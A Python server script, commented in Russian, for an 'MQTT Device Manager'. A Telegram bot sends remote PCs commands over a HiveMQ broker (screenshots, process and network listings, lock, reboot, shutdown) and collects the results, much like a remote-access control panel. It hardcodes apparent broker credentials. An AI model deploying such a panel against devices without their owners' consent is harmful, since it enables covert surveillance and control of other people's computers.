# main.py - MQTT Server + Telegram Bot
import paho.mqtt.client as mqtt
import json
import sqlite3
import time
import os
import asyncio
import threading
import logging
import sys
from datetime import datetime
import base64
from typing import Dict, List, Optional, Any
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, BufferedInputFile

# ============ НАСТРОЙКА ЛОГИРОВАНИЯ ============
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    datefmt='%H:%M:%S'
)
logger = logging.getLogger(__name__)

# ============ КОНФИГУРАЦИЯ ============

# MQTT
MQTT_CONFIG = {
    "host": "04f19c56c4b441a68aa08dafd39d7713.s1.eu.hivemq.cloud",
    "port": 8883,
    "username": "kkk",  # ЗАМЕНИТЕ
    "password": "102036514530"  # ЗАМЕНИТЕ
}

# Telegram
BOT_TOKEN = "BOT_TOKEN"  # ЗАМЕНИТЕ НА ТОКЕН ВАШЕГО БОТА
ADMIN_ID = 5153650495  # ВАШ ID В TELEGRAM

# ============ БАЗА ДАННЫХ ============
DB_PATH = os.path.join(os.path.dirname(__file__), "devices.db")

def init_db():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS devices (
            device_id TEXT PRIMARY KEY,
            name TEXT,
            last_seen INTEGER,
            first_seen INTEGER,
            os_info TEXT,
            ip_address TEXT,
            is_online INTEGER DEFAULT 0
        )
    """)
    
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS command_history (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT,
            command TEXT,
            result TEXT,
            timestamp INTEGER,
            status TEXT
        )
    """)
    
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS screenshots (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT,
            image_data TEXT,
            timestamp INTEGER,
            filename TEXT
        )
    """)
    
    conn.commit()
    conn.close()
    logger.info("📦 Database initialized")

def get_all_devices():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("SELECT device_id, name, last_seen, is_online, os_info FROM devices ORDER BY last_seen DESC")
    devices = cursor.fetchall()
    conn.close()
    return devices

def get_device(device_id: str):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("SELECT device_id, name, last_seen, is_online, os_info FROM devices WHERE device_id = ?", (device_id,))
    device = cursor.fetchone()
    conn.close()
    return device

def update_device(device_id: str, name: str, os_info: str = None):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    current_time = int(time.time())
    cursor.execute("SELECT * FROM devices WHERE device_id = ?", (device_id,))
    existing = cursor.fetchone()
    if existing:
        cursor.execute("UPDATE devices SET name = ?, last_seen = ?, os_info = ?, is_online = 1 WHERE device_id = ?",
                       (name, current_time, os_info, device_id))
    else:
        cursor.execute("INSERT INTO devices (device_id, name, last_seen, first_seen, os_info, is_online) VALUES (?, ?, ?, ?, ?, 1)",
                       (device_id, name, current_time, current_time, os_info))
    conn.commit()
    conn.close()

def set_device_offline(device_id: str):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("UPDATE devices SET is_online = 0 WHERE device_id = ?", (device_id,))
    conn.commit()
    conn.close()

def delete_device(device_id: str):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("DELETE FROM devices WHERE device_id = ?", (device_id,))
    cursor.execute("DELETE FROM command_history WHERE device_id = ?", (device_id,))
    cursor.execute("DELETE FROM screenshots WHERE device_id = ?", (device_id,))
    conn.commit()
    conn.close()

def save_command_history(device_id: str, command: str, result: str = None, status: str = "pending"):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("INSERT INTO command_history (device_id, command, result, timestamp, status) VALUES (?, ?, ?, ?, ?)",
                   (device_id, command, result, int(time.time()), status))
    conn.commit()
    conn.close()

def save_screenshot(device_id: str, image_data: str) -> str:
    try:
        image_bytes = base64.b64decode(image_data)
        os.makedirs("screenshots", exist_ok=True)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"screenshots/screenshot_{device_id[:8]}_{timestamp}.jpg"
        with open(filename, 'wb') as f:
            f.write(image_bytes)
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute("INSERT INTO screenshots (device_id, image_data, timestamp, filename) VALUES (?, ?, ?, ?)",
                       (device_id, image_data, int(time.time()), filename))
        conn.commit()
        conn.close()
        logger.info(f"📸 Screenshot saved: {filename}")
        return filename
    except Exception as e:
        logger.error(f"Error saving screenshot: {e}")
        return None

# ============ КЛАВИАТУРЫ ДЛЯ TELEGRAM ============

def get_main_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📋 Список устройств", callback_data="list_devices")],
        [InlineKeyboardButton(text="📊 Статистика", callback_data="stats")],
        [InlineKeyboardButton(text="🗑 Очистить оффлайн", callback_data="clean_offline")]
    ])

def get_device_menu(device_id: str):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📸 Скриншот", callback_data=f"cmd_{device_id}_screenshot")],
        [InlineKeyboardButton(text="💻 Системная информация", callback_data=f"cmd_{device_id}_sysinfo")],
        [InlineKeyboardButton(text="📋 Список процессов", callback_data=f"cmd_{device_id}_tasklist")],
        [InlineKeyboardButton(text="🌐 Сетевая информация", callback_data=f"cmd_{device_id}_netinfo")],
        [InlineKeyboardButton(text="🔋 Батарея", callback_data=f"cmd_{device_id}_battery")],
        [InlineKeyboardButton(text="⚙️ Системные действия", callback_data=f"sys_actions_{device_id}")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
    ])

def get_system_actions_menu(device_id: str):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔒 Блокировка", callback_data=f"cmd_{device_id}_lock")],
        [InlineKeyboardButton(text="🌙 Сон", callback_data=f"cmd_{device_id}_sleep")],
        [InlineKeyboardButton(text="🔄 Перезагрузка", callback_data=f"cmd_{device_id}_reboot")],
        [InlineKeyboardButton(text="🛑 Выключение", callback_data=f"cmd_{device_id}_shutdown")],
        [InlineKeyboardButton(text="🔊 Громкость MAX", callback_data=f"cmd_{device_id}_volmax")],
        [InlineKeyboardButton(text="📝 Блокнот", callback_data=f"cmd_{device_id}_notepad")],
        [InlineKeyboardButton(text="🧮 Калькулятор", callback_data=f"cmd_{device_id}_calc")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data=f"device_{device_id}")]
    ])

# ============ MQTT СЕРВЕР ============
class MQTTDeviceServer:
    def __init__(self, bot: Bot = None):
        self.client = mqtt.Client(client_id="server_admin", protocol=mqtt.MQTTv311)
        self.client.tls_set()
        self.client.username_pw_set(MQTT_CONFIG["username"], MQTT_CONFIG["password"])
        self.client.on_connect = self.on_connect
        self.client.on_message = self.on_message
        self.client.on_disconnect = self.on_disconnect
        self.online_devices = set()
        self.pending_commands = {}
        self.running = True
        self.base_topic = "devices"
        self.bot = bot
        logger.info("🚀 MQTT Server initialized")
    
    def on_connect(self, client, userdata, flags, rc):
        if rc == 0:
            logger.info("✅ Connected to HiveMQ Cloud!")
            topics = [f"{self.base_topic}/+/status", f"{self.base_topic}/+/response", 
                      f"{self.base_topic}/+/screenshot", f"{self.base_topic}/+/ping", f"{self.base_topic}/+/info"]
            for topic in topics:
                self.client.subscribe(topic, qos=1)
                logger.info(f"📡 Subscribed to: {topic}")
            threading.Thread(target=self.check_offline_devices, daemon=True).start()
        else:
            logger.error(f"❌ Connection failed with code: {rc}")
    
    def on_disconnect(self, client, userdata, rc):
        logger.warning("⚠️ Disconnected from HiveMQ Cloud")
        if self.running:
            logger.info("🔄 Reconnecting in 5 seconds...")
            time.sleep(5)
            self.connect()
    
    def on_message(self, client, userdata, msg):
        try:
            topic = msg.topic
            parts = topic.split('/')
            if len(parts) < 3:
                return
            device_id = parts[1]
            msg_type = parts[2]
            payload = msg.payload.decode('utf-8')
            
            handlers = {
                'status': self.handle_status,
                'ping': self.handle_ping,
                'response': self.handle_response,
                'screenshot': self.handle_screenshot,
                'info': self.handle_info
            }
            if msg_type in handlers:
                handlers[msg_type](device_id, payload)
        except Exception as e:
            logger.error(f"Error processing message: {e}")
    
    def handle_status(self, device_id: str, payload: str):
        try:
            data = json.loads(payload)
            name = data.get('name', 'Unknown')
            os_info = data.get('os', 'Unknown')
            update_device(device_id, name, os_info)
            self.online_devices.add(device_id)
            logger.info(f"🟢 {name} ({device_id[:8]}) подключен")
            
            # Уведомление в Telegram
            if self.bot:
                asyncio.create_task(self.send_telegram_notification(f"🟢 Устройство подключено: {name}"))
            
            if device_id in self.pending_commands:
                for cmd in self.pending_commands[device_id]:
                    self.send_command(device_id, cmd)
                self.pending_commands[device_id] = []
        except json.JSONDecodeError:
            logger.error(f"Invalid JSON in status from {device_id}")
    
    def handle_ping(self, device_id: str, payload: str):
        try:
            data = json.loads(payload)
            name = data.get('name', 'Unknown')
            update_device(device_id, name)
            self.online_devices.add(device_id)
            logger.debug(f"📡 Ping from {device_id[:8]}")
        except Exception as e:
            logger.error(f"Ping error: {e}")
    
    def handle_response(self, device_id: str, payload: str):
        try:
            data = json.loads(payload)
            command = data.get('command', '')
            result = data.get('result', '')
            result_str = json.dumps(result, indent=2, ensure_ascii=False)
            save_command_history(device_id, command, result_str, "completed")
            
            # Отправляем результат в Telegram
            if self.bot:
                device = get_device(device_id)
                name = device[1] if device else device_id[:8]
                
                if command == "screenshot":
                    # Скриншот обрабатывается отдельно
                    pass
                else:
                    text = f"📌 Результат команды *{command}*\n"
                    text += f"🖥 Устройство: *{name}*\n\n"
                    if isinstance(result, dict):
                        for key, value in result.items():
                            if isinstance(value, (dict, list)):
                                text += f"*{key}:*\n```json\n{json.dumps(value, indent=2, ensure_ascii=False)}\n```\n"
                            else:
                                text += f"*{key}:* {value}\n"
                    else:
                        text += f"```\n{result}\n```"
                    
                    asyncio.create_task(self.send_telegram_message(text))
            
            self.display_result(device_id, command, result)
        except Exception as e:
            logger.error(f"Response error: {e}")
    
    def handle_screenshot(self, device_id: str, payload: str):
        try:
            filename = save_screenshot(device_id, payload)
            if filename:
                device = get_device(device_id)
                name = device[1] if device else device_id[:8]
                
                # Отправляем скриншот в Telegram
                if self.bot:
                    try:
                        image_bytes = base64.b64decode(payload)
                        asyncio.create_task(
                            self.send_telegram_photo(
                                image_bytes, 
                                f"📸 Скриншот с ПК: *{name}*"
                            )
                        )
                    except Exception as e:
                        logger.error(f"Error sending screenshot to Telegram: {e}")
                
                print("\n" + "="*60)
                print(f"📸 СКРИНШОТ ПОЛУЧЕН")
                print(f"🖥 Устройство: {name}")
                print(f"📁 Файл: {filename}")
                print("="*60 + "\n")
        except Exception as e:
            logger.error(f"Screenshot error: {e}")
    
    def handle_info(self, device_id: str, payload: str):
        try:
            data = json.loads(payload)
            name = data.get('name', 'Unknown')
            os_info = data.get('os', 'Unknown')
            update_device(device_id, name, os_info)
            
            # Отправляем информацию в Telegram
            if self.bot:
                text = f"💻 *Системная информация*\n"
                text += f"🖥 Устройство: *{name}*\n\n"
                for key, value in data.items():
                    if key == 'memory':
                        text += f"*Память:*\n"
                        for k, v in value.items():
                            text += f"  {k}: {v}\n"
                    elif key == 'disks':
                        text += f"*Диски:*\n"
                        for disk in value:
                            text += f"  {disk['drive']}: {disk['total_gb']}GB, свободно: {disk['free_gb']}GB\n"
                    else:
                        text += f"*{key}:* {value}\n"
                
                asyncio.create_task(self.send_telegram_message(text))
            
            print("\n" + "="*60)
            print(f"💻 СИСТЕМНАЯ ИНФОРМАЦИЯ")
            print(f"🖥 Устройство: {name}")
            print("="*60)
            for key, value in data.items():
                if key in ['memory', 'disks']:
                    print(f"  {key}:")
                    for k, v in value.items():
                        print(f"    {k}: {v}")
                else:
                    print(f"  {key}: {value}")
            print("="*60 + "\n")
        except Exception as e:
            logger.error(f"Info error: {e}")
    
    def send_command(self, device_id: str, command: str) -> bool:
        try:
            topic = f"{self.base_topic}/{device_id}/command"
            if device_id not in self.online_devices:
                if device_id not in self.pending_commands:
                    self.pending_commands[device_id] = []
                self.pending_commands[device_id].append(command)
                logger.info(f"💾 Command '{command}' saved for offline device {device_id[:8]}")
                save_command_history(device_id, command, None, "queued")
                return True
            payload = json.dumps({'command': command, 'timestamp': int(time.time())})
            result = self.client.publish(topic, payload, qos=1)
            if result.rc == mqtt.MQTT_ERR_SUCCESS:
                save_command_history(device_id, command, None, "sent")
                logger.info(f"🚀 Command '{command}' sent to {device_id[:8]}")
                return True
            return False
        except Exception as e:
            logger.error(f"Send command error: {e}")
            return False
    
    def display_result(self, device_id: str, command: str, result: Any):
        device = get_device(device_id)
        name = device[1] if device else device_id[:8]
        print("\n" + "="*60)
        print(f"📌 РЕЗУЛЬТАТ КОМАНДЫ")
        print(f"🖥 Устройство: {name}")
        print(f"📋 Команда: {command}")
        print("="*60)
        if isinstance(result, dict):
            for key, value in result.items():
                if key == 'screenshot':
                    print(f"  {key}: <base64 image>")
                elif key == 'error':
                    print(f"  ❌ {key}: {value}")
                elif isinstance(value, (dict, list)):
                    print(f"  {key}:")
                    print(json.dumps(value, indent=4, ensure_ascii=False))
                else:
                    print(f"  {key}: {value}")
        else:
            print(f"  {result}")
        print("="*60 + "\n")
    
    def check_offline_devices(self):
        while self.running:
            try:
                time.sleep(30)
                devices = get_all_devices()
                current_time = int(time.time())
                for device_id, name, last_seen, is_online, _ in devices:
                    if current_time - last_seen > 120 and is_online:
                        set_device_offline(device_id)
                        self.online_devices.discard(device_id)
                        logger.info(f"🔴 {name} ({device_id[:8]}) перешел в оффлайн")
                        
                        if self.bot:
                            asyncio.create_task(self.send_telegram_notification(f"🔴 Устройство отключилось: {name}"))
            except Exception as e:
                logger.error(f"Check offline error: {e}")
    
    def connect(self) -> bool:
        try:
            self.client.connect(MQTT_CONFIG["host"], MQTT_CONFIG["port"], 60)
            self.client.loop_start()
            return True
        except Exception as e:
            logger.error(f"❌ Connection error: {e}")
            return False
    
    def disconnect(self):
        self.running = False
        self.client.loop_stop()
        self.client.disconnect()
        logger.info("👋 Disconnected")
    
    # ============ TELEGRAM HELPERS ============
    
    async def send_telegram_message(self, text: str):
        if self.bot:
            try:
                await self.bot.send_message(ADMIN_ID, text, parse_mode="Markdown")
            except Exception as e:
                logger.error(f"Error sending Telegram message: {e}")
    
    async def send_telegram_photo(self, image_bytes: bytes, caption: str = ""):
        if self.bot:
            try:
                await self.bot.send_photo(
                    ADMIN_ID,
                    BufferedInputFile(image_bytes, filename="screenshot.jpg"),
                    caption=caption,
                    parse_mode="Markdown"
                )
            except Exception as e:
                logger.error(f"Error sending Telegram photo: {e}")
    
    async def send_telegram_notification(self, text: str):
        if self.bot:
            try:
                await self.bot.send_message(ADMIN_ID, f"🔔 {text}")
            except Exception as e:
                logger.error(f"Error sending notification: {e}")

# ============ TELEGRAM БОТ ============

def setup_bot_handlers(dp: Dispatcher, mqtt_server: MQTTDeviceServer):
    
    @dp.message(Command("start"))
    async def cmd_start(message: types.Message):
        if message.from_user.id != ADMIN_ID:
            await message.answer("❌ Доступ запрещен")
            return
        await message.answer(
            "🤖 MQTT Device Manager\n"
            "Управляйте своими устройствами через Telegram",
            reply_markup=get_main_menu()
        )
    
    @dp.callback_query(lambda c: c.data == "main_menu")
    async def main_menu(callback: types.CallbackQuery):
        if callback.from_user.id != ADMIN_ID:
            await callback.answer("❌ Доступ запрещен")
            return
        await callback.message.edit_text(
            "🤖 Главное меню",
            reply_markup=get_main_menu()
        )
        await callback.answer()
    
    @dp.callback_query(lambda c: c.data == "list_devices")
    async def list_devices(callback: types.CallbackQuery):
        if callback.from_user.id != ADMIN_ID:
            await callback.answer("❌ Доступ запрещен")
            return
        
        devices = get_all_devices()
        if not devices:
            await callback.message.edit_text(
                "❌ Нет подключенных устройств",
                reply_markup=get_main_menu()
            )
            await callback.answer()
            return
        
        text = "📋 *Список устройств:*\n\n"
        keyboard = []
        
        for device_id, name, last_seen, is_online, os_info in devices:
            status = "🟢 Онлайн" if is_online else "🔴 Оффлайн"
            last = datetime.fromtimestamp(last_seen).strftime("%H:%M:%S")
            text += f"{status} *{name}*\n"
            text += f"  ID: `{device_id[:8]}...`\n"
            text += f"  Последнее: {last}\n\n"
            keyboard.append([InlineKeyboardButton(
                text=f"{status} {name}",
                callback_data=f"device_{device_id}"
            )])
        
        keyboard.append([InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")])
        
        await callback.message.edit_text(
            text,
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard)
        )
        await callback.answer()
    
    @dp.callback_query(lambda c: c.data.startswith("device_"))
    async def device_menu(callback: types.CallbackQuery):
        if callback.from_user.id != ADMIN_ID:
            await callback.answer("❌ Доступ запрещен")
            return
        
        device_id = callback.data.replace("device_", "")
        device = get_device(device_id)
        if not device:
            await callback.answer("❌ Устройство не найдено")
            return
        
        status = "🟢 Онлайн" if device[3] else "🔴 Оффлайн"
        text = f"💻 *{device[1]}*\n"
        text += f"Статус: {status}\n"
        text += f"🆔 ID: `{device_id}`\n"
        text += f"💿 ОС: {device[4] or 'Неизвестно'}\n"
        
        await callback.message.edit_text(
            text,
            parse_mode="Markdown",
            reply_markup=get_device_menu(device_id)
        )
        await callback.answer()
    
    @dp.callback_query(lambda c: c.data.startswith("sys_actions_"))
    async def system_actions(callback: types.CallbackQuery):
        if callback.from_user.id != ADMIN_ID:
            await callback.answer("❌ Доступ запрещен")
            return
        
        device_id = callback.data.replace("sys_actions_", "")
        await callback.message.edit_text(
            "⚙️ *Системные действия*",
            parse_mode="Markdown",
            reply_markup=get_system_actions_menu(device_id)
        )
        await callback.answer()
    
    @dp.callback_query(lambda c: c.data.startswith("cmd_"))
    async def execute_command(callback: types.CallbackQuery):
        if callback.from_user.id != ADMIN_ID:
            await callback.answer("❌ Доступ запрещен")
            return
        
        parts = callback.data.split("_")
        if len(parts) < 3:
            await callback.answer("❌ Ошибка")
            return
        
        device_id = parts[1]
        command = parts[2]
        
        # Отправляем команду через MQTT
        success = mqtt_server.send_command(device_id, command)
        
        if success:
            await callback.answer(f"✅ Команда '{command}' отправлена")
        else:
            await callback.answer(f"❌ Не удалось отправить команду")
    
    @dp.callback_query(lambda c: c.data == "stats")
    async def stats(callback: types.CallbackQuery):
        if callback.from_user.id != ADMIN_ID:
            await callback.answer("❌ Доступ запрещен")
            return
        
        devices = get_all_devices()
        total = len(devices)
        online = sum(1 for d in devices if d[3])
        
        text = "📊 *Статистика*\n\n"
        text += f"📱 Всего устройств: {total}\n"
        text += f"🟢 Онлайн: {online}\n"
        text += f"🔴 Оффлайн: {total - online}\n"
        text += f"📈 Активность: {int(online/total*100) if total > 0 else 0}%"
        
        await callback.message.edit_text(
            text,
            parse_mode="Markdown",
            reply_markup=get_main_menu()
        )
        await callback.answer()
    
    @dp.callback_query(lambda c: c.data == "clean_offline")
    async def clean_offline(callback: types.CallbackQuery):
        if callback.from_user.id != ADMIN_ID:
            await callback.answer("❌ Доступ запрещен")
            return
        
        devices = get_all_devices()
        deleted = 0
        for device_id, _, _, is_online, _ in devices:
            if not is_online:
                delete_device(device_id)
                deleted += 1
        
        await callback.answer(f"🗑 Удалено {deleted} оффлайн устройств")
        
        # Обновляем список
        await list_devices(callback)

# ============ ЗАПУСК ============

async def main():
    print("="*60)
    print("🤖 MQTT Device Manager + Telegram Bot")
    print("="*60)
    
    # Инициализация БД
    init_db()
    
    # Создаем бота
    bot = Bot(token=BOT_TOKEN)
    dp = Dispatcher()
    
    # Создаем MQTT сервер
    mqtt_server = MQTTDeviceServer(bot)
    
    # Настраиваем обработчики бота
    setup_bot_handlers(dp, mqtt_server)
    
    # Подключаем MQTT
    if not mqtt_server.connect():
        print("❌ Не удалось подключиться к HiveMQ Cloud")
        print("Проверьте настройки MQTT_CONFIG")
        return
    
    # Запускаем бота
    print("🤖 Telegram бот запущен!")
    print(f"📱 Ваш ID в Telegram: {ADMIN_ID}")
    print("="*60)
    
    try:
        # Запускаем бота и MQTT в одном цикле
        await dp.start_polling(bot)
    except KeyboardInterrupt:
        print("\n👋 Остановка...")
    finally:
        mqtt_server.disconnect()
        await bot.session.close()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n👋 Программа остановлена")
    except Exception as e:
        logger.error(f"Fatal error: {e}")
        raise
